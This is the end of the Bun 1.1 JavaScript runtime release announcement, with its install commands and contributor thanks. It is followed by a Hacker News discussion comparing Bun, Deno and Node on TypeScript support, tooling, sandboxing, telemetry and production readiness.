Bun.write() and Bun.file().text() are 3x faster under concurrent load. bunx esbuild is 50x faster than npx esbuild. fs.cp() and fs.copyFile() are 50% faster on Linux across filesystems. Bun.peek() is 90x faster with a new implementation. expect().toEqual() is 100x faster using Map and Set objects. setTimeout() and setInterval() are 4x faster on Linux. Bun.spawnSync() is 50% faster at buffering stdout on Linux. node:http is 14% faster using a hello world benchmark. fs.readdir() is 40x faster than Node.js using the recursive option. bun:sqlite uses 4x less memory. fs.readlink() uses 2x less memory. fs.stat() uses 2x less memory. FormData uses less memory with copy-on-write file upload on Linux Getting started That's it — that's Bun 1.1, and this is still just the beginning for Bun. We've made Bun faster, more reliable, fixed a thousand of bugs, added tons of new features and APIs, and now Bun supports Windows. To get started, run any of the following commands in your terminal. Install Bun curl powershell npm brew docker curl -fsSL https://bun.sh/installbash Upgrade Bun bun upgrade We're hiring We're hiring engineers, designers, and past or present contributors to JavaScript engines like V8, WebKit, Hermes, and SpiderMonkey to join our team in-person in San Francisco to build the future of JavaScript. You can check out our careers page or send us an email. Thank you to 364 contributors! Bun is free, open source, and MIT-licensed. As such, that also means that we receive a wide range of open source contributions from the community. We'd like to thank everyone who has opened an issue, fixed a bug, or even contributed a feature. @0x346e3730 @0xflotus @2hu12 @52 @7f8ddd @A-D-E-A @a4addel @Aarav-Juneja @AaronDewes @aarvinr @aayushbtw @adrienbrault @adtac @akash1412 @akumarujon @alangecker @alexandertrefz @alexkates @alexlamsl @almmiko @amartin96 @amt8u @andyexeter @annervisser @antongolub @aquapi @aralroca @Arden144 @argosphil @ArnaudBarre @arturovt @ashoener @asilvas @asomethings @aszenz @audothomas @AugusDogus @AvantaR @axlEscalada @babarkhuroo @baboon-king @bdenham @BeeMargarida @benjervis @BeyondMagic @bh1337x @birkskyum @bjon @blimmer @booniepepper @brablc @bradymadden97 @brettgoulder @brianknight10 @BrookJeynes @brookslybrand @Brooooooklyn @browner12 @bru02 @buffaybu @buhrmi @Cadienvan @camero2734 @capaj @cdfzo @cena-ko @cfal @CGQAQ @chawyehsu @chocolateboy @chrisbodhi @chrishutchinson @ciceropablo @Cilooth @clay-curry @codehz @colinhacks @Connormiha @coratgerl @cornedor @CyberFlameGO @cyfdecyf @cyfung1031 @DaleSeo @danadajian @DarthDanAmesh @davidmhewitt @davlgd @Dawntraoz @desm @DevinJohw @dfabulich @dfaio @Didas-git @diogo405 @dmitri-gb @DontBreakAlex @dotspencer @dottedmag @DuGlaser @dylang @e253 @ebidel @eduardvercaemer @eemelipa @eknowles @EladBezalel @eliot-akira @emlez @eriklangille @ErikOnBike @eroblaze @eventualbuddha @fdb @fecony @fehnomenal @FireSquid6 @fmajestic @fneco @FortyGazelle700 @G-Rath @gabry-ts @gamedevsam @gaurishhs @ggobbe @gnuns @gtramontina @guarner8 @guest271314 @h2210316651 @Hamcker @Hanaasagi @hborchardt @HForGames @hiadamk @HK-SHAO @hugo-syn @huseeiin @hustLer2k @I-A-S @igorshapiro @igorwessel @iidebyo @Illyism @ImBIOS @imcatwhocode @ImLunaHey @jaas666 @jakeboone02 @jakeg @james-elicx @jamesgordo @jasperkelder @jcarpe @jcbhmr @jecquas @JeremyFunk @jeroenpg @jeroenvanrensen @jerome-benoit @jhmaster2000 @JibranKalia @JoaoAlisson @joeyw @johnpyp @jonahsnider @jonathantneal @JorgeJimenez15 @joseph082 @jrz @jsparkdev @jt3k @jumoog @kaioduarte @kantuni @karlbohlmark @karmabadger @keepdying @kingofdreams777 @kitsuned @klatka @knightspore @kosperera @kpracuk @krk @kryparnold @kucukkanat @kunokareal @kyr0 @L422Y @LapsTimeOFF @lei-rs @lgarron @lino-levan @lithdew @liz3 @Longju000 @lorenzodonadio @lpinca @lqqyt2423 @lucasmichot @LukasKastern @lukeingalls @m1212e @malthe @markusn @Marukome0743 @marvinruder @maschwenk @MasterGordon @masterujjval @mathiasrw @MatricalDefunkt @matthewyu01 @maxmilton @meck93 @mi4uu @miccou @mimikun @mkayander @mkossoris @morisk @mountainash @moznion @mroyme @MuhibAhmed @nangchan @nathanhammond @nazeelashraf @nellfs @nil1511 @nithinkjoy-tech @NReilingh @nshen @nullun @nxzq @nygmaaa @o-az @o2sevruk @oguimbal @Osmose @otgerrogla @otterDeveloper @owlcode @pacexy @pan93412 @Pandapip1 @panva @paperless @Parzival-3141 @PaulaBurgheleaGithub @paulbaumgart @PaulRBerg @ped @Pedromdsn @perpetualsquid @pesterev @pfgithub @philolo1 @pierre-cm @Pierre-Mike @pnodet @polarathene @PondWader @prabhatexit0 @Primexz @qhariN @RaisinTen @rajatdua @RaresAil @rauny-brandao @rhyzx @RiskyMH @risu729 @RodrigoDornelles @rohanmayya @RohitKaushal7 @rtxanson @ruihe774 @rupurt @ryands17 @s-rigaud @s0h311 @saklani @samfundev @samualtnorman @sanyamkamat @scotttrinh @SeedyROM @sequencerr @sharpobject @shinichy @silversquirl @simylein @sirenkovladd @sirhypernova @sitiom @Slikon @Smoothieewastaken @sonyarianto @Southpaw1496 @spicyzboss @sroussey @sstephant @starsep @stav @styfle @SukkaW @sum117 @techvlad @thapasusheel @ThatOneBro @ThatOneCalculator @therealrinku @thunfisch987 @tikotzky @tk120404 @tobycm @tom-sherman @tomredman @toneyzhen @toshok @traviscooper @trnxdev @tsndr @TwanLuttik @twlite @VietnamecDevelopment @Vilsol @vinnichase @vitalspace @vitoorgomes @vitordino @vjpr @vladaman @vlechemin @Voldemat @vthemelis @vveisard @wbjohn @weyert @whygee-dev @winghouchan @WingLim @wobsoriano @xbjfk @xHyroM @ximex @xlc @xNaCly @yadav-saurabh @yamcodes @Yash-Singh1 @YashoSharma @yharaskrik @Yonben @yschroe @yukulele @yus-ham @zack466 @zenshixd @zieka @zongzi531 @ZTL-UwU",
    "commentLink": "https://news.ycombinator.com/item?id=39895744",
    "commentBody": "Bun 1.1 (bun.sh)324 points by ksec 17 hours agohidepastfavorite189 comments madsbuch 2 hours agoI use both Deno and Bun in production (albeit, on different projects). They are both great upgrades from node. In particular with the first class support for TypeScript. Bun is great for large projects with the enhanced DX over any node based environments I have worked on - I use it for a mono-repo project with several frontends and a GraphQl backend. Involved test suites run in 5 seconds, etc. Deno seems to work really well i lambda style environment (I use them with Supabase) due to their module approach that are entirely stand alone. This is great for small scripts to glue things together. reply thatguyagain 1 hour agoprevI find it hilarious that we now present runtimes and other programming stuff like it was Apple presenting a new iPhone. This would be satire 15 years ago. No disrespect to Bun tho, I love Bun. reply madsbuch 41 minutes agoparentThe audience for these types of announcement is bigger. My intuition is that there are many more consumers of node-like environments today than any runtimes 15 years ago. reply yurishimo 1 hour agoparentprevI feel like it’s meant to be satire here as well. reply earslap 7 hours agoprevDid not realize Bun had (even if rudimentary) macros - bundle time executing code support. That is pretty neat! https://bun.sh/docs/bundler/macros reply FlorianRappl 12 minutes agoparentYes its neat - I wish more bundlers adopt it! In the past I've written a little plugin that is available for almost all bundlers allowing you to do that: https://dev.to/florianrappl/getting-bundling-superpowers-usi... reply agos 56 minutes agoparentprevthis is one of the most interesting new things in the bundler space - Parcel is introducing some form of macro too. It's way overdue to have some way to program what happens at bundling time (without writing your own bundler plugin) reply Waterluvian 7 hours agoparentprevWow that’s pretty neat. Because of that I also learned about import attributes (https://github.com/tc39/proposal-import-attributes) which is probably going to be quite useful and make the 50 lines of imports in some of my files look even dumber. reply Valodim 3 hours agorootparentSome loaders already encode stuff in the path url style, e.g. vite-svg-loader import iconUrl from './my-icon.svg?url' Maybe I'm not imaginative enough but this seems like a reasonably restricted (i.e. simple) way of parametrizing imports. reply liampulles 2 hours agoprev\"...Bun on Windows passes 98% of our own test suite for Bun on macOS and Linux.\" Does this mean the release was made with failing tests, or am I misunderstanding? reply vallode 2 hours agoparentLooks like it, it seems the 2% are mostly odd platform specific issues that the authors' did not deem very important (my assumption for the release happening anyway). AFAIK this[1] PR tries to fix them. [1]: https://github.com/oven-sh/bun/pull/9729 reply basil-rash 1 hour agoparentprevSkipping particular tests depending on platform is a very common practice, for better or worse. reply sharas- 24 minutes agoparentprevCheckout bun's code. It's a mess. Bun is run by a little prince. reply gregoriol 1 hour agoprevIs it me or does this project tries to do too many things at once? \"Bun is an npm-compatible package manager\", and an http server, and a websocket server, and a test library, and a bundler, and... why? reply norman784 39 minutes agoparentI think is that modern languages like Go and Rust (there are for sure others, but I don't have experience with any other language that ships with all the tools) ship with all the tools you need, formatter, linter, test runner, etc, Go goes even further than Rust and ships a very complete std focused on web and Javascript is used primarily in web, so it makes sense that ships with all the libraries needed to build a web server, also websocket is a standard, so it's easy to implement it and make it work with the browser. Nowadays if you start a new Javascript project you need to setup, vite/esbuild/webpack, eslint/oxlint/biome, prettier, typescript, etc, that is a ton of dependencies that YOU need to maintain for years, and if it is part of the tool you are using, then you don't, ideally there shouldn't be a breaking change, let's see how bun manages that when the time comes. I am waiting for bun or a tool that has everything I need to bundle my frontend app, I'm very tired of fiddling with all the dependencies and try to make to work every dependency together, I have a legacy project that I work on, I would have migrated a long time ago to another tool, but there is none that would fix the current issue and it's managing the project build, test, formatter, lint dependencies, after using Rust I feel super frustrated with the Javascript ecosystem state. Also you asked why? I want to work on the project, there is already a lot of work to maintain the dependencies up to date, the tooling should not be part of that work. reply dgellow 48 minutes agoparentprevBecause that’s what people want. That’s how you can get a really good developer experience similar to golang or other languages. Just install one tool to build, lint, format, run tests, run your local project. No time spent trying to setup a bundler when what you want is to build a new project. Regarding runtime libraries, it’s similar to the battery-included approach of go or python, you get what you need to get started out of the box and only reach for dependencies when you want to go further. Testing library, an http server, a websocket server that’s perfectly reasonable to have as core library of a runtime developed to run web servers. reply laborcontract 47 minutes agoparentprevTo me they’re kind of like Astral/Ruff and is it bad to say I kind of like it? reply melodyogonna 37 minutes agoparentprevBecause the project would be a failure otherwise, and including those is the main goal of the project. reply dimitrisnl 1 hour agoparentprevThat's the selling point reply gregoriol 52 minutes agorootparentThat's the scary point reply norman784 36 minutes agorootparentI like their selling point and if there is enough demand, I think the node community will implement at least a few of those features. reply captn3m0 17 hours agoprevRequest for the bun team: please provide a clear support policy/EOL timeline. Bonus points for clarity on the stability guarantees that are offered between versions and modules. https://github.com/oven-sh/bun/issues/7990 (Via https://github.com/endoflife-date/endoflife.date/pull/4382) reply fastball 8 hours agoparentI don't think the bun devs are currently parcelling things up like that so doubt this would be worth the effort at this time, i.e. I don't think they're backporting any fixes from 1.1 into a 1.0.x release. reply captn3m0 7 hours agorootparentStating that would be helpful as well. reply TheChaplain 15 hours agoparentprevYeah something like this; https://nodejs.org/en/about/previous-releases#release-schedu... or: https://devguide.python.org/versions/ reply afavour 8 hours agoprevI feel like such a downer when I ask this about Bun and Deno, but: why should I use them instead of Node? I don’t mean to take away from the obviously impressive engineering effort here. But VC funding always gives me pause because I don’t know how long the product is going to be around. I was actually more interested in Deno when it promised a reboot of the JS ecosystem but both Bun and Deno seem to have discovered that Node interoperability is a requirement so they’re all in the same (kinda crappy) ecosystem. I’m just not sure what the selling point is that makes it worth the risk. reply nikeee 7 hours agoparentWe could drastically simplify the building and deployment process of our services. By far the greatest advantage is that it runs TS natively. Dropping the compilation stage simplifies everything. From docker imaging to writing DB migrations to getting proper stack traces. You don't need source maps. You don't have to map printed stack traces to the source. Debugging just works. You don't need to configure directories because src/ is different than dist/ for DB migrations. You don't have to build a `tsc --watch & node --watch` pipeline to get hot reloading. You don't need cross-env. No more issues with cjs/esm interop. Maybe you don't even need a multi-stage Dockerfile. That's for bun. Deno might have a similar story. We did not opt-in to the Bun-specific APIs, so we can migrate back if Bun fails. Maybe we could even migrate to something like ts-node. Shouldn't be that hard in that case. IMHO the API of Bun, as well as the package manager, sometimes tries to be _too_ convenient or is too permissive. reply ibash 7 hours agorootparentKind of. When you do try to run bun in production you'll find out that it has significant differences to node -- like not handling uncaught exceptions: https://github.com/oven-sh/bun/issues/429 Then you'll use bun build and run node in production, only to find that sourcemaps don't actually work at all: https://github.com/oven-sh/bun/issues/7427 So you'll switch to esbuild + node in production :) Definitely excited for the promise of bun, but it's not quite baked yet. reply Jarred 7 hours agorootparentWe’ll add the uncaught exceptions handler likely before Bun 1.2 and fix the issue with sourcemaps. Sourcemaps do work (with some rough edges) at runtime when running TS/JSX/JS files, but are in a worse state with “bun build” right now. We’ve been so busy with adding Windows support that it’s been hard to prioritize much else reply ibash 4 hours agorootparentMuch appreciated and definitely rooting for bun! It’s still my goto choice for dev and can’t wait to switch production back to bun :) reply zackify 6 hours agorootparentprevEvery couple weeks I try again to run my app fully on bun. For now I just use it as a packager. The big ones for me are continual prisma issues. Mainly due to poor decisions on their side it seems… Vite crashing. Because I’m using remix. And then the worst one I don’t see a way around: sentry profiling which requires v8. I can’t wait for the day everything can be on bun. Everything else sucks and is so slow or requires really bad configuration to make it work. Can’t believe node itself and TS are so terrible with module compatibility. Bun solves all of this and is 20000x faster when I can use it! reply ibash 4 hours agorootparentWhat prisma issues are you running into? For us we just installed node alongside bun in our docker container and then ran prisma with node… was there something else? reply searchableguy 6 hours agorootparentprevYou can use tsx as loader with node if you want to directly run typescript. node --import tsx ./file.ts reply zackify 5 hours agorootparentThe problem is, if you have ESM and then a tool in your repo like jest, requires commonjs. Now you have to compile stuff. In my case I’ve had apps use certain ts config options, and then another library has a start script which is incompatible. So you’re stuck needing a different TS config for both things. These annoyances are solved with bun reply galaxyLogic 6 hours agorootparentprevDoes it support editing the source-files while in the debugger? I've been hesitant to move to TypeScript because I'm unsure how well the debugger works in practice. My current platform is Node.js + WebStorm IDE as a debugger. I can debug the JavaScript and I can modify it while stopping at a breakpoint or debugger-statement. It is a huge time-saver that I don't have to see something wrong with my code while in the debugger and then find the original source-file to modify and recompile and then restart. Just curious, do Deno and Bun support edit-while-debug, out of the box? Or do I need to install some dependencies to make that work? reply __alexs 2 hours agorootparentprevts-node has all of these features too? reply xdennis 30 minutes agorootparentYes, but it's slower. Here are the times for running a script that just prints hello. $ time bun hello.ts real 0m0.015s user 0m0.008s sys 0m0.008s $ time ts-node hello.ts real 0m0.727s user 0m1.534s sys 0m0.077s reply Waterluvian 7 hours agorootparentprevCurious: does it run TS natively or does it just transpile for you? Because the former suggests exciting opportunity for better compiling or JITting if it can actually commit to holding on to the typing. reply nikeee 7 hours agorootparentIt does not do any type checking. You have to run tsc with noEmit separately. If you run `bun run foo.ts`, it just ignores all type annotations. It is transpiled to JS internally by removing the types (or it skips the types while parsing). While doing that, it keeps track of the original source locations. If you see some stack trace, you get the original location in the ts source. Running tsc with noEmit is pretty much the standard in the frontend as well, as the TS is bundled by esbuild/rollup directly. reply leptons 4 hours agorootparentprevI'm not sure how difficult it would be for Nodejs to support .ts files natively. But if that's the main reason to use Bun, I'd be worried about its long term viability. Node could announce native .ts support at any time and then Bun might not look so good. reply paulddraper 6 hours agorootparentprev> By far the greatest advantage is that it runs TS natively. So why doesn't any major runtime run Java natively? Or C++ natively? Or Rust natively? Why is this such a cool unlock that hasn't been done for any other language? --- 85% of this are people tired/bored of Node.js. reply smt88 5 hours agorootparentPython is among the most popular languages and it doesn't require a compile step. TypeScript is entirely metadata, so it just doesn't make sense to need to compile it. reply 7bit 2 hours agorootparentprevI don't understand your point. I don't even understand your argument. The java runtime runs java. And C++ and Rust are compiled and have no runtime. reply hibbelig 1 hour agorootparentJava is compiled, too. The Java runtime is the JVM which runs byte code. reply Osmose 8 hours agoparentprevThe speed increases are nothing to sneeze at; I've moved a few Vite projects over to Bun and even without specific optimizations it's still noticeably faster. A specific use case where Bun beat the pants out of Node for me was making a standalone executable. Node has a very VERY in-development API for this that requires a lot of work and doesn't support much, and all the other options (pkg, NEXE, ncc, nodejs-static) are out-of-date, unmaintained, support a single OS, etc. `bun build --compile` worked out-of-the-box for me, with the caveat of not supporting native node libraries at the time—this 1.1 release fixes that issue. reply llimllib 8 hours agorootparentI've hit significant failures every time I've tried to use `bun build --compile`; the most recent code I was trying to compile hit this one[1]. I documented how to build a binary from a JS app with node, deno, and bun here [2]. Node SEA is a bad DX, but not that complex once you figure it out. 1: https://github.com/oven-sh/bun/issues/6832 2: https://github.com/llimllib/node-esbuild-executable reply Jarred 6 hours agorootparentI’m pretty sure issue #6842 was fixed in Bun v1.0.32 or so and we forgot to mark the issue as fixed Will check once I get to my computer Edit: was not fixed. We made other changes to fs.readSync to improve Node compatibility, but missed this. It will get fixed though reply throwitaway1123 7 hours agorootparentprevBun's standalone executables are great, but as far as I'm aware unlike Deno and Node there's no cross compilation support, and Node supports more CPU/OS combinations than either Deno or Bun. Node supports less common platforms like Windows ARM for example (which will become more important once the new Snapdragon X Elite laptops start rearing their heads [1]). [1] https://www.youtube.com/watch?v=uWH2rHYNj3c reply Jarred 6 hours agorootparentWe'll add cross-compilation support and Windows arm64 eventually. I don't expect much difficulty from Windows ARM once we figure out how to get JSC to compile on that platform. We support Linux ARM64 and macOS arm64. reply galaxyLogic 5 hours agorootparentDoes it support building an EXE with all source-code removed? reply throwitaway1123 8 hours agoparentprevThe most compelling argument for Deno is the permission system in my opinion. Node added a permission system recently, but it's much more coarse grained than Deno's. Being able to limit a script to listening on a specific hostname and port, or only allowing it to read a specific environment variable is pretty cool, and makes me less paranoid about trusting third party dependencies. Both Bun and Deno are also more performant than Node in many cases, and add a bunch of little quality of life improvements. reply int_19h 7 hours agorootparentThe real question is how much you can trust this. Those kinds of permission systems have been tried before - e.g. .NET used to have something called \"Code Access Security\". It was retired largely because the very notion of VM-enforced sandbox was deemed inadequate from experience. IIRC SecurityManager in Java was something similar, also deprecated for similar reasons. I'm afraid that Deno will just be a repeat of that. reply throwitaway1123 6 hours agorootparentI definitely wouldn't make the Deno sandbox my only line of defense — I'm a strong proponent of defense in depth. Now having said that, there's definitely a precedent for trusting V8's sandboxing capabilities. Cloudflare is running untrusted user code across their entire network and relying on V8 isolates as a sandboxing mechanism for Cloudflare Workers. I'm not sure I would go that far, but I do think we should be taking advantage of the strides browser developers have been making from a security perspective. When I re-watched Ryan Dahl's original conference talk where he introduced Deno, the sandboxing aspect was the part that resonated the most with me. But again, it's always best to have multiple layers of security. You should sandbox your applications and audit your dependencies, those mitigation techniques aren't mutually exclusive. reply int_19h 6 hours agorootparent.NET sandbox was used for ClickOnce and Silverlight for many years. Java's was used for applets even longer. It worked until it didn't. The people who designed those things ultimately threw in the towel and said that if you want that kind of security, use containers or VMs. reply throwitaway1123 6 hours agorootparent> The people who designed those things ultimately threw in the towel and said that if you want that kind of security, use containers or VMs. I can see why they chose that route. It's a huge maintenance burden. I can't imagine Google throwing in the towel when it comes to securing their browser's JS engine though. reply int_19h 5 hours agorootparentThat's assuming that you can fit everything within the needs of the browser sandbox. But server-side JS needs are broader than that. reply throwitaway1123 5 hours agorootparentIt's much easier to worry about locking down the few server-side modules which allow access to the underlying OS, than it is to have to worry about securing V8's JIT compiler. Node's module-based permission system literally just bans certain standard library modules from being imported (Deno's is more fine grained thankfully). That's a much smaller attack surface area to worry about compared to securing the underlying JS engine. reply vmfunction 2 hours agorootparentAlso with Deno, it become very easy to write typed cli. .ts file can be run as script very easily with permission access defined on top of the script such as: #!/usr/bin/env -S deno run --allow-net Then one can just run ./test.ts if the script has +x permission. Also project such as https://cliffy.io has made writing cli way more enjoyable than node. It is a good idea to beware of the VC. So it is good idea to support project such as Hono (projects conform to modern web standard, and is runtime agnostic for JS). reply yolm 7 hours agoparentprevI used both Deno and Bun. Bun is really nicely compatible with node. Speed of course is excellent, but the main reason I use Bun and recommend it: You replace node, npm, tsx, jest, nodemon and esbuild with one single integrated tool that's faster than all of the others. reply bducycy 7 hours agorootparentNicely compatible, until it's not. We banned all these forks at work. The dev onboarding overhead is not worth the benefits. Having all 1700 repos using the same build tooling is more important than slight increases in build performance. reply tipiirai 4 hours agorootparentWhy do you have 1700 repos? reply pjmlp 1 hour agorootparentThe wonders of JavaScript package dependencies, where basic CS stuff is a function exported as a package. reply triyambakam 5 hours agorootparentprevBanned? Is that why you had to post this on a green text account? Because that sounds immature. If you really have so many repos it sounds annoying that there isn't room for team level experimentation. reply yen223 4 hours agorootparentIt's not immature, it's pragmatic. You do have to weigh the benefits of being able to use non-standard tools vs the cost of having not being able to reuse the same tooling, linters, compilers, and what-not for all projects. When you have a lot of projects to support, it's rare for the benefits to outweight the costs reply dimgl 5 hours agorootparentprevDevil's advocate: Deno and Bun are not yet fully backwards compatible with Node. I myself have run into a _ton_ of pain trying to introduce Bun for my team. This can become a big time sink on bigger teams. That time could be saved by just not allowing it until a full team initiative is agreed on. reply KronisLV 5 hours agorootparentprev> If you really have so many repos it sounds annoying that there isn't room for team level experimentation. For what it's worth, I'll say that I can understand such top down governance: you'd have an easier time around moving across projects that you work on within the org, there'd be less risk of a low bus factor, BOM and documentation/onboarding might become easier. Same as how there are Java or .NET shops out there, that might also focus on a particular runtime (e.g. JDK vendor) or tooling (an IDE, or a particular CI solution, even if it's Jenkins). On the other hand, if the whole org would use MySQL but you'd have a use case for which PostgreSQL might be a better fit, or vice versa, it'd kind of suck to be in that particular situation. It's probably the same story for Node/Deno/Bun, React/Vue/Angular or anything else out there. No reason why that mandated option couldn't eventually be Bun, though, for better or worse. reply hiccuphippo 8 hours agoparentprevIt also helps avoid a node/v8 monoculture, just like with web browsers. I'm sure the ecosystem as a whole will get better because of it, even if you decide not to use it. reply crabmusket 6 hours agoparentprevI really like Deno for small scripts and small side projects - it's just fast to get started with. And it allows me to use web standards, like URL imports to grab packages from CDNs instead of having a config file. There's just less to think about, like oh what was Node's crypto thing? Node is making strides in web compatibility, and building in things like a test runner. And I don't have much interest in migrating company projects away from Node. But Deno feels really fresh and light when I just need to run some JS. reply WuxiFingerHold 1 hour agoparentprevI have ask myself the same question a couple of weeks ago and decided to use Node for some side stuff. Simply because of Node being the most mature, boring choice. Still, I like the DX improvements of both Bun and Deno a lot. We'll see how it all plays out in some years. reply charrondev 8 hours agoparentprevI can give a bit of perspective here. I'm currently porting our the Vanilla Forums frontend (~500k lines of typescript) from using Node, Yarn (we used it back before npm supported lockfiles) and Webpack, to build with bun and Vite. There are a few notable differences: - The out of the box typescript interoperability is actually very nice, and much faster than using `ts-node` as we were before. - Installations (although rare) are a fair bit faster. - With bun I don't have to do the frankly crazy song and dance that node now requires for ES modules. - Using bun is allowing us to drop `jest` and related packages as a dependency entirely and it executes our test suite a lot faster than jest did. For my personal projects I now reach for bun rather than node because - It has Typescript support out of the box. - It has a nice test runner out of the box. - It has much runtime compatibility with browsers (`fetch` is a good example). - The built-in web server is sufficient for small projects and avoids the need to pull in various dependencies. reply pjmlp 1 hour agorootparentMy old dog experience has proven multiple times that staying with the main reference tool for the platform always pays out long term, as most forks or guest languages eventually fade out after the hype cycle is over. The existing tools eventually get the features that actually matter, and I avoided rewriting stuff twice, on the meantime I gladly help some of those projects to backport into the reference tooling for the platform. The only place I really haven't followed this approach was in regards to C++ in UNIX, which at first sight might feel I am contradicting myself, however many tend to forget C++ was born at Bell Labs, on the same building as UNIX folks were on, and CFront tooling was symbiotic with UNIX. reply yurishimo 57 minutes agorootparentYepp! There is absolutely no reason to upgrade early. If it becomes the reference tool one day, then it should be easy to switch. But you also have to remember this is JS we’re talking about… stuff changes every 10 minutes. reply triyambakam 5 hours agorootparentprevBun test is so enjoyably faster than Jest. I have a file of thousands of string manipulation tests that Jest just crashes on after 3 minutes while Bun runs in in milliseconds. reply fastball 8 hours agorootparentprevFYI if you want to make a list on HN you're gonna need to add an extra line break everywhere. reply afavour 8 hours agorootparentprevESM interop is inarguable. But these days Node has a test runner and compatibility with browsers (it implements fetch)… I guess I feel like Node is likely to catch up with most of this stuff over the lifetime of any long running project. reply charrondev 7 hours agorootparentOne of things that makes me more bullish on bun rather than Deno is that bun is intentionally aiming for compatibility with node and the npm ecosystem while Deno doesn't seem to be. reply fastball 8 hours agorootparentprevSure, but node also has a huge amount of baggage and as others have pointed out is much slower. reply 1123581321 7 hours agorootparentprevHow is the Bun test runner’s compatibility with Jest’s methods? Can a mature test suite be easily ported? We are currently looking at vite and vitest to run 1600 jest tests. reply afturner 6 hours agorootparentYou can track the progress here: https://github.com/oven-sh/bun/issues/1825 There's still a ways to go but folks are actively contributing. reply briantakita 5 hours agorootparentprev> - The built-in web server is sufficient for small projects and avoids the need to pull in various dependencies. ElysiaJS is a good library when you do need a bit more with the routing + middleware. It has great benchmarks as well. reply postepowanieadm 3 hours agoparentprevCute logo. And UX is pretty great: integrated fetch, simplified fs api, integrated test runner (I miss good old TAP style assertions though), ESM/CJS modules just work, some async sugar. I think if they offer me a paid *worker solution, with sqlite, that's something I'm willing to pay for. reply angra_mainyu 6 hours agoparentprevBun's equivalent of \"npm i\" is extremely fast, at least an order of magnitude faster on all 3 of my machines. Since I run \"npm i\" many times per day, that in itself is a big timesaver, not just for local dev but also in CI pipelines. reply arcanemachiner 6 hours agorootparentHave you tried pnpm? https://pnpm.io/ reply rlt 6 hours agorootparentprevHow does it compare to pnpm reply bufferoverflow 5 hours agorootparentpnpm is 3x slower or even more https://miro.medium.com/v2/resize:fit:832/1*noWyIXw-yeNZq5Db... https://kinsta.com/wp-content/uploads/2023/12/bun-benchmark.... And for running scripts, it's not even close https://miro.medium.com/v2/resize:fit:1400/1*oyPEXsFfZsTg4mO... reply briantakita 5 hours agorootparentprevI found Bun to be faster. Monorepo support is a bit kludgy though. Once you know of the workarounds, it's ok. See my comment on https://github.com/oven-sh/bun/issues/5413#issuecomment-1956... AFAIK, Pnpm monorepos do not follow standard npm. Bun does follow standard npm monorepos. Pnpm's feature to override dependency versions is nice for legacy projects with many 3rd party dependencies. Not sure if Bun has the same feature. I mostly use it on greenfield projects with dependencies that I control. reply vbezhenar 8 hours agoparentprevNode is safe choice, IMO. I tried deno and I think it's cool, but I'm staying on node for the time being. Things that deno makes easier are not that hard with node and stability matters for me. For example I had to spend few hours rewriting my tiny service with changed deno API. Don't have any experience with bun, though. reply mmastrac 7 hours agorootparentIf there are any specific places where Deno didn't support a node API, please file a bug -- we definitely shoot for as close to node.js as possible, and if you have to modify your code that's most often on us. (I'm a deno core dev) reply vmfunction 2 hours agorootparentHow do we report that. Some issues has come up with aws on esm.sh https://esm.sh/@aws-sdk/client-secrets-manager@3.540.0 It is just not working. reply vbezhenar 4 hours agorootparentprevNo, I wrote my service some time ago (basically GitHub Webhook which does some crypto to validate payload and invokes kubectl) using Deno API and few months ago I took some time to update dependencies but found out that with new standard library version some APIs are either deprecated or removed, I don't really remember, but I felt the need to rewrite it. Don't take it as a criticism, I totally understand that you need to iterate on API and nobody promised me that it'd be stable till the end of time, but still work is work. reply brlewis 8 hours agoparentprevSee my answer \"what's cool about deno\" https://gitlab.com/brlewis/brlewis-aoc/-/blob/main/README.md... reply waynenilsen 8 hours agoparentprevBun has been great as a package manager, test suite runner and typescript interpreter. We use node in prod reply CuriouslyC 6 hours agoparentprevI can't speak for deno, but bun is drop in compatible for most things and the test runner speed alone is enough to make it worth using. reply dcre 6 hours agoparentprevI haven’t used them yet for full sized apps, but they are both fantastic for scripting and small CLIs. Between the ease of running scripts, nice standard libraries, npm ecosystem, and excellent type system, I now feel TypeScript is a better scripting language than Python or Ruby. reply triyambakam 5 hours agorootparentI used to think so too, but that was because I had never really used Python. I still think Ruby is a mess, but it's so amazing how easy it is to manipulate data in Python, and so much faster. I recently wrote a Node/Bun/Deno app that parses a 5k line text file into JSON. The JavaScript on any runtime takes 30-45 seconds. The Python implementation is sub 1 second. I would not have been able to finish the tool so quickly if I were stuck relying on JS. I still love Typescript but I'm not as blind about it now. reply dcre 4 hours agorootparentThat runtime doesn't make any sense. This script creates a 1,000,000 line CSV string and then parses it into JSON in 700ms with Bun, and this is doing both things the slow way, creating the string with a giant array map and join, and parsing with a giant split('') on newline and map. https://gist.github.com/david-crespo/8fea68cb38ea89edceb161d... reply Jarred 5 hours agorootparentprevWhat does the code do? 30-45 seconds to parse a 5k line text file into JSON sounds like something is going very wrong reply Solvency 7 hours agoparentprevThe real question is why would I use Bun over Vite? Even the ThreeJS developers determined Vite is the best. reply dcre 6 hours agorootparentBun and Vite are not analogous. Bun is a runtime with a standard library, bundler, test runner. Vite is a bundler. You can run Vite through Bun. reply gr4vityWall 17 hours agoprevSeems like a good release. I watched their video, and some charts were a bit unclear, as in, I didn't know if they were comparing with the previous Bun version or Node.js. My experience with using Bun in side projects has been good. The built-in APIs work well in my experience, and I hope popular runtimes adopt at least a subset of them. The hashing and the SQLite bindings come to mind as APIs that I wish were available in Deno and Node.js as well. They collect some telemetry by default. I don't think the install script tells you that. The only mention of it that I've found is in the Bunfile documentation: https://bun.sh/docs/runtime/bunfig#telemetry I'd prefer if it was opt-in, and that users were given instructions for disabling it if they want to during installation. They offer an option to create a dependency-free executable for your project, which bundles the runtime with your .js entrypoint. That works great if you want a single binary to distribute to users, but at the moment, the file size is still pretty big (above 90MB on GNU/Linux for a small project). Not terrible, but nothing comparable to Go or QuickJS yet. I wonder if in the future, Bun would offer an option to compile itself with certain features disabled, so we'd get a smaller binary. I have been playing with using Bun as a Haxe target. It works pretty well and IMO it's a choice to consider if you like Haxe more than TypeScript, or if you want to add a web server to an existing Haxe project without adding another programming language. You can also to do things like generating validation code at compile time, which seems hard to do with just TypeScript. reply Jarred 7 hours agoparentNote that we do not currently send telemetry anywhere. The extent of what we track right now is a bitset of what builtin modules were imported and a count of how many http requests were sent with fetch(), and a few things like that. This is used in the message printed when Bun panics so we can have a better idea of what the code was doing/did when it crashed reply stefanos82 12 hours agoparentprevThank you for letting me know about telemetry; I had no idea. reply rnmkr 8 hours agorootparentThen people go crazy when Golang announced they want to enable informed opt-out telemetry. reply notelem 7 hours agoparentprev> They collect some telemetry by default I wondered why every time I upgraded bun macos would pop up a permissions dialog. This explains that. Anyway, it can be disabled by adding the following to your environment: export DO_NOT_TRACK=1 This is the data 